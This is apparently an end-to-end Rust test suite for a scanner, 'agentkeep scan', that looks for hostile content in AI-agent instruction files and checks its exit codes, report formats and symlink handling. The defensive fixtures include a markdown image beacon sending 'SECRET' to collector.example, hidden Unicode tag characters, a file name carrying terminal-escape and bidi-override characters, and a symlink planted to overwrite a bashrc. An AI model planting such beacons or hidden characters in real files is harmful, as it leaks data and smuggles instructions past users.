//! `agentkeep scan` end to end through the real binary: exit codes, output
//! formats, `--output`, `--rules`, `--max-file-size`, `--list-rules` and
//! `--test-rules`. Fixtures are benign (hosts under `.example`, fake keys).

#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

use std::fs;
use std::path::Path;
use std::process::{Command, Output};

use serde_json::Value;

fn bin() -> &'static str {
    env!("CARGO_BIN_EXE_agentkeep")
}

/// Run `agentkeep scan <args>` with colour forced off by environment and a
/// pipe for stdout (so the TTY check says no as well).
fn scan(args: &[&str]) -> Output {
    Command::new(bin())
        .arg("scan")
        .args(args)
        .env_remove("GITHUB_STEP_SUMMARY")
        .output()
        .expect("agentkeep runs")
}

fn code(out: &Output) -> i32 {
    out.status.code().expect("exited normally, not by a signal")
}

fn stdout(out: &Output) -> String {
    String::from_utf8(out.stdout.clone()).unwrap()
}

fn stderr(out: &Output) -> String {
    String::from_utf8(out.stderr.clone()).unwrap()
}

fn write(root: &Path, rel: &str, content: &str) {
    let p = root.join(rel);
    fs::create_dir_all(p.parent().unwrap()).unwrap();
    fs::write(p, content).unwrap();
}

const BEACON: &str = "# Notes\n\n![x](https://collector.example/p.png?d=SECRET)\n";
const TAGS: &str = "Use tabs.\u{E0072}\u{E0075}\u{E006E}\n";

/// A repository with one high finding (beacon) and one critical (tags).
fn repo() -> tempfile::TempDir {
    let tmp = tempfile::tempdir().unwrap();
    write(tmp.path(), "docs/notes.md", BEACON);
    write(tmp.path(), ".cursorrules", TAGS);
    write(tmp.path(), "src/lib.rs", "pub fn f() {}\n");
    tmp
}

fn root_arg(dir: &tempfile::TempDir) -> &str {
    dir.path().to_str().unwrap()
}

#[test]
fn clean_directory_exits_zero() {
    let tmp = tempfile::tempdir().unwrap();
    write(tmp.path(), "README.md", "# Fine\n\nNothing here.\n");
    let out = scan(&[root_arg(&tmp)]);
    assert_eq!(code(&out), 0, "{}", stderr(&out));
    assert_eq!(stdout(&out), "No findings in 1 file scanned.\n");
}

#[test]
fn findings_at_or_above_fail_on_exit_one() {
    let tmp = repo();
    let out = scan(&[root_arg(&tmp)]);
    assert_eq!(code(&out), 1, "{}", stderr(&out));
    let text = stdout(&out);
    assert!(
        text.contains(
            ".cursorrules (1 finding)\n  .cursorrules:1:10  CRITICAL hidden-unicode/tag-characters"
        ),
        "{text}"
    );
    assert!(
        text.contains("  docs/notes.md:3:1  HIGH     exfiltration/markdown-image-beacon"),
        "{text}"
    );
    // The snippet escapes the invisible characters it reports.
    assert!(
        text.contains("Use tabs.\\u{E0072}\\u{E0075}\\u{E006E}"),
        "{text}"
    );
    assert!(
        text.ends_with("2 findings (1 critical, 1 high) in 3 files scanned.\n"),
        "{text}"
    );
    // No colour on a pipe.
    assert!(!text.contains('\u{1b}'));

    // Only the critical one counts at --fail-on critical: still 1.
    assert_eq!(code(&scan(&[root_arg(&tmp), "--fail-on", "critical"])), 1);
    // Without the critical file, high is below critical: 0.
    fs::remove_file(tmp.path().join(".cursorrules")).unwrap();
    assert_eq!(code(&scan(&[root_arg(&tmp), "--fail-on", "critical"])), 0);
    assert_eq!(code(&scan(&[root_arg(&tmp)])), 1);
    assert_eq!(code(&scan(&[root_arg(&tmp), "--fail-on", "info"])), 1);
}

#[test]
fn no_color_and_pipes_never_get_escape_sequences() {
    let tmp = repo();
    let out = Command::new(bin())
        .args(["scan", root_arg(&tmp)])
        .env("NO_COLOR", "1")
        .output()
        .unwrap();
    assert!(!out.stdout.contains(&0x1b));
}

#[test]
fn json_report_follows_the_schema() {
    let tmp = repo();
    let out = scan(&[root_arg(&tmp), "--format", "json"]);
    assert_eq!(code(&out), 1, "{}", stderr(&out));
    let raw = stdout(&out);
    let v: Value = serde_json::from_str(&raw).unwrap();
    assert_eq!(v["schema"], "agentkeep.scan/1");
    assert_eq!(v["tool"]["name"], "agentkeep");
    assert_eq!(v["root"], root_arg(&tmp));
    let findings = v["findings"].as_array().unwrap();
    assert_eq!(findings.len(), 2);
    assert_eq!(findings[0]["path"], ".cursorrules");
    assert_eq!(findings[0]["severity"], "critical");
    assert_eq!(findings[1]["rule_id"], "exfiltration/markdown-image-beacon");
    assert_eq!(findings[1]["start"]["line"], 3);
    assert_eq!(findings[1]["fingerprint"].as_str().unwrap().len(), 64);
    assert_eq!(v["summary"]["files_scanned"], 3);
    assert_eq!(v["summary"]["by_severity"]["critical"], 1);
    // Stable key order: the documented order, not alphabetical.
    let keys = [
        "\"schema\"",
        "\"tool\"",
        "\"root\"",
        "\"findings\"",
        "\"skipped\"",
        "\"errors\"",
        "\"summary\"",
    ];
    let offsets: Vec<usize> = keys.iter().map(|k| raw.find(k).unwrap()).collect();
    assert!(offsets.windows(2).all(|w| w[0] < w[1]), "{raw}");
}

#[test]
fn sarif_report_has_rules_results_and_fingerprints() {
    let tmp = repo();
    let out = scan(&[root_arg(&tmp), "--format", "sarif"]);
    assert_eq!(code(&out), 1, "{}", stderr(&out));
    let v: Value = serde_json::from_str(&stdout(&out)).unwrap();
    assert_eq!(
        v["$schema"],
        "https://json.schemastore.org/sarif-2.1.0.json"
    );
    assert_eq!(v["version"], "2.1.0");
    let run = &v["runs"][0];
    let rules = run["tool"]["driver"]["rules"].as_array().unwrap();
    assert!(rules.len() >= 7);
    let srcroot = run["originalUriBaseIds"]["%SRCROOT%"]["uri"]
        .as_str()
        .unwrap();
    assert!(
        srcroot.starts_with("file:///") && srcroot.ends_with('/'),
        "{srcroot}"
    );
    let results = run["results"].as_array().unwrap();
    assert_eq!(results.len(), 2);
    let r = &results[1];
    let idx = usize::try_from(r["ruleIndex"].as_u64().unwrap()).unwrap();
    assert_eq!(rules[idx]["id"], r["ruleId"]);
    assert_eq!(r["level"], "error");
    let loc = &r["locations"][0]["physicalLocation"];
    assert_eq!(loc["artifactLocation"]["uri"], "docs/notes.md");
    assert_eq!(loc["artifactLocation"]["uriBaseId"], "%SRCROOT%");
    assert_eq!(loc["region"]["startLine"], 3);
    assert_eq!(
        r["partialFingerprints"]["agentkeep/v1"]
            .as_str()
            .unwrap()
            .len(),
        64
    );
}

#[test]
fn output_file_receives_the_report() {
    let tmp = repo();
    let out_dir = tempfile::tempdir().unwrap();
    let file = out_dir.path().join("scan.sarif");
    let out = scan(&[
        root_arg(&tmp),
        "--format",
        "sarif",
        "--output",
        file.to_str().unwrap(),
    ]);
    assert_eq!(code(&out), 1, "{}", stderr(&out));
    assert!(out.stdout.is_empty());
    assert!(stderr(&out).contains("2 finding(s) written to"));
    let v: Value = serde_json::from_str(&fs::read_to_string(&file).unwrap()).unwrap();
    assert_eq!(v["runs"][0]["results"].as_array().unwrap().len(), 2);

    // Text to a file is never coloured.
    let text_file = out_dir.path().join("scan.txt");
    scan(&[root_arg(&tmp), "-o", text_file.to_str().unwrap()]);
    let text = fs::read_to_string(&text_file).unwrap();
    assert!(text.contains("hidden-unicode/tag-characters") && !text.contains('\u{1b}'));

    // An unwritable output is exit 2, not a silent pass.
    let bad = out_dir.path().join("missing-dir/scan.json");
    let out = scan(&[root_arg(&tmp), "-o", bad.to_str().unwrap()]);
    assert_eq!(code(&out), 2);
    assert!(
        stderr(&out).contains("cannot write the report"),
        "{}",
        stderr(&out)
    );
}

#[test]
fn a_single_file_is_scanned_relative_to_its_directory() {
    let tmp = repo();
    let file = tmp.path().join("docs/notes.md");
    let out = scan(&[file.to_str().unwrap(), "--format", "json"]);
    assert_eq!(code(&out), 1);
    let v: Value = serde_json::from_str(&stdout(&out)).unwrap();
    assert_eq!(v["findings"][0]["path"], "notes.md");
    assert_eq!(v["summary"]["files_scanned"], 1);
}

#[test]
fn usage_and_load_errors_exit_two() {
    let tmp = repo();
    let missing = tmp.path().join("missing");
    let out = scan(&[missing.to_str().unwrap()]);
    assert_eq!(code(&out), 2);
    assert!(
        stderr(&out).contains("cannot read scan root"),
        "{}",
        stderr(&out)
    );

    assert_eq!(code(&scan(&[root_arg(&tmp), "--format", "xml"])), 2);
    assert_eq!(code(&scan(&[root_arg(&tmp), "--fail-on", "severe"])), 2);
    assert_eq!(code(&scan(&[root_arg(&tmp), "--max-file-size", "1G"])), 2);
    assert_eq!(code(&scan(&["--list-rules", "--test-rules"])), 2);

    // A bad rule file stops the scan: a missing rule must not look clean.
    let rules = tempfile::tempdir().unwrap();
    write(
        rules.path(),
        "custom/broken.yaml",
        "id: custom/broken\nseverity: high\n",
    );
    let out = scan(&[root_arg(&tmp), "--rules", rules.path().to_str().unwrap()]);
    assert_eq!(code(&out), 2);
    let err = stderr(&out);
    assert!(
        err.contains("broken.yaml") && err.contains("missing field"),
        "{err}"
    );

    // A rule directory that does not exist.
    let out = scan(&[root_arg(&tmp), "--rules", missing.to_str().unwrap()]);
    assert_eq!(code(&out), 2);
    assert!(stderr(&out).contains("cannot load rules from"));
}

const CUSTOM_RULE: &str = r#"id: custom/internal-host
severity: medium
title: Internal host name in agent instructions
description: Internal names should not reach agent context.
applies_to: ["*.md"]
detect:
  regex: 'intranet\.example'
remediation: Remove the internal host name.
examples:
  match: ["see intranet.example/wiki"]
  nomatch: ["see docs.example/wiki"]
"#;

#[test]
fn extra_rule_directories_are_loaded() {
    let tmp = tempfile::tempdir().unwrap();
    write(
        tmp.path(),
        "AGENTS.md",
        "Docs live at intranet.example/wiki.\n",
    );
    let rules = tempfile::tempdir().unwrap();
    write(rules.path(), "custom/internal-host.yaml", CUSTOM_RULE);
    let rules_arg = rules.path().to_str().unwrap();

    let out = scan(&[root_arg(&tmp), "--rules", rules_arg, "--format", "json"]);
    // Medium is below the default --fail-on high.
    assert_eq!(code(&out), 0, "{}", stderr(&out));
    let v: Value = serde_json::from_str(&stdout(&out)).unwrap();
    assert_eq!(v["findings"][0]["rule_id"], "custom/internal-host");
    assert_eq!(
        code(&scan(&[
            root_arg(&tmp),
            "--rules",
            rules_arg,
            "--fail-on",
            "medium"
        ])),
        1
    );

    // The same directory twice is a duplicate id: exit 2.
    let out = scan(&[root_arg(&tmp), "--rules", rules_arg, "--rules", rules_arg]);
    assert_eq!(code(&out), 2);
    assert!(
        stderr(&out).contains("duplicate rule id"),
        "{}",
        stderr(&out)
    );

    let out = scan(&["--list-rules", "--rules", rules_arg]);
    assert!(stdout(&out).contains("custom/internal-host"));
}

#[test]
fn max_file_size_skips_large_files() {
    let tmp = tempfile::tempdir().unwrap();
    let big = format!("{}{BEACON}", "x".repeat(4096));
    write(tmp.path(), "big.md", &big);
    let out = scan(&[root_arg(&tmp), "--max-file-size", "1K", "--format", "json"]);
    assert_eq!(code(&out), 0, "{}", stderr(&out));
    let v: Value = serde_json::from_str(&stdout(&out)).unwrap();
    assert_eq!(v["skipped"][0]["path"], "big.md");
    assert_eq!(v["skipped"][0]["reason"], "too-large");
    assert_eq!(v["summary"]["files_scanned"], 0);
    assert_eq!(code(&scan(&[root_arg(&tmp), "--max-file-size", "8K"])), 1);
}

#[test]
fn list_rules_prints_every_builtin_rule() {
    let out = scan(&["--list-rules"]);
    assert_eq!(code(&out), 0);
    let text = stdout(&out);
    for id in [
        "hidden-unicode/tag-characters",
        "exfiltration/markdown-image-beacon",
        "risky-shell/curl-pipe-shell",
        "ci-workflow/agent-untrusted-trigger-write-token",
    ] {
        let line = text
            .lines()
            .find(|l| l.starts_with(id))
            .unwrap_or_else(|| panic!("{id}\n{text}"));
        assert!(
            line.contains("  high  ") || line.contains("  critical  "),
            "{line}"
        );
    }
}

#[test]
fn test_rules_runs_inline_examples() {
    let out = scan(&["--test-rules"]);
    assert_eq!(code(&out), 0, "{}", stdout(&out));
    assert!(stdout(&out).contains("examples: all passed."));

    // A community rule whose `nomatch` example matches fails with exit 1
    // and names the example.
    let rules = tempfile::tempdir().unwrap();
    write(
        rules.path(),
        "custom/internal-host.yaml",
        &CUSTOM_RULE.replace("see docs.example/wiki", "intranet.example too"),
    );
    let out = scan(&["--test-rules", rules.path().to_str().unwrap()]);
    assert_eq!(code(&out), 1, "{}", stdout(&out));
    let text = stdout(&out);
    assert!(text.contains("FAIL  custom/internal-host"), "{text}");
    assert!(text.contains("custom/internal-host: examples.nomatch[0] (scanned as example.md): expected no finding, got 1"), "{text}");
    assert!(text.contains("1 failed."), "{text}");
    // --rules directories are tested too.
    let out = scan(&["--rules", rules.path().to_str().unwrap(), "--test-rules"]);
    assert_eq!(code(&out), 1);
}

#[cfg(unix)]
#[test]
fn hostile_file_names_are_escaped_in_text_output() {
    let tmp = tempfile::tempdir().unwrap();
    write(tmp.path(), "evil\u{1b}[2J\u{202E}dm.md", BEACON);
    let out = scan(&[root_arg(&tmp)]);
    assert_eq!(code(&out), 1);
    let text = stdout(&out);
    assert!(
        !text.contains('\u{1b}') && !text.contains('\u{202E}'),
        "{text:?}"
    );
    assert!(
        text.contains("evil\\u{001B}[2J\\u{202E}dm.md:3:1"),
        "{text}"
    );
    let sarif = scan(&[root_arg(&tmp), "--format", "sarif"]);
    let v: Value = serde_json::from_str(&stdout(&sarif)).unwrap();
    assert_eq!(
        v["runs"][0]["results"][0]["locations"][0]["physicalLocation"]["artifactLocation"]["uri"],
        "evil%1B%5B2J%E2%80%AEdm.md"
    );
}

#[cfg(unix)]
#[test]
fn the_report_is_never_written_through_a_symlink() {
    // A hostile checkout plants `scan.sarif` pointing at a file outside it.
    let tmp = repo();
    let victim_dir = tempfile::tempdir().unwrap();
    let victim = victim_dir.path().join("bashrc");
    fs::write(&victim, "# original\n").unwrap();
    let link = tmp.path().join("scan.sarif");
    std::os::unix::fs::symlink(&victim, &link).unwrap();
    let out = scan(&[
        root_arg(&tmp),
        "--format",
        "sarif",
        "-o",
        link.to_str().unwrap(),
    ]);
    assert_eq!(code(&out), 2, "{}", stderr(&out));
    assert!(stderr(&out).contains("symbolic link"), "{}", stderr(&out));
    assert_eq!(fs::read_to_string(&victim).unwrap(), "# original\n");
    assert!(fs::symlink_metadata(&link)
        .unwrap()
        .file_type()
        .is_symlink());
    // No temporary file is left behind.
    let leftovers: Vec<_> = fs::read_dir(tmp.path())
        .unwrap()
        .filter_map(Result::ok)
        .filter(|e| {
            e.file_name()
                .to_string_lossy()
                .starts_with(".agentkeep-scan-")
        })
        .collect();
    assert!(leftovers.is_empty());
}

#[test]
fn an_existing_report_is_replaced() {
    let tmp = repo();
    let out_dir = tempfile::tempdir().unwrap();
    let file = out_dir.path().join("scan.json");
    fs::write(&file, "old content that is longer than nothing").unwrap();
    let out = scan(&[
        root_arg(&tmp),
        "--format",
        "json",
        "-o",
        file.to_str().unwrap(),
    ]);
    assert_eq!(code(&out), 1, "{}", stderr(&out));
    let v: Value = serde_json::from_str(&fs::read_to_string(&file).unwrap()).unwrap();
    assert_eq!(v["schema"], "agentkeep.scan/1");
}

#[cfg(unix)]
#[test]
fn symlinks_in_the_root_are_reported_not_followed() {
    let tmp = tempfile::tempdir().unwrap();
    let outside = tempfile::tempdir().unwrap();
    write(outside.path(), "secret.md", BEACON);
    std::os::unix::fs::symlink(outside.path().join("secret.md"), tmp.path().join("link.md"))
        .unwrap();
    let out = scan(&[root_arg(&tmp), "--format", "json"]);
    assert_eq!(code(&out), 0, "{}", stdout(&out));
    let v: Value = serde_json::from_str(&stdout(&out)).unwrap();
    assert_eq!(v["skipped"][0]["reason"], "symlink");
    assert_eq!(v["findings"], serde_json::json!([]));
}
